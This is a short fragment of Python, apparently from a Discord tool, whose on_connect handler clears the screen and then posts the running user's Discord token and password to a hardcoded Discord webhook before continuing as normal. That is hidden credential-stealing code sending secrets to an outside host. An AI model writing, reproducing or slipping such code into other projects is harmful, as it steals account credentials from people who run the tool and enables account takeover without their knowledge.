...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/926272744453177365/zDHf_z2xwMpQ2HdmMZmoFaebwy7e3EQ7nDfUvd1hWBXvPAscNKrrUnFjibqklOuN-NCC',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
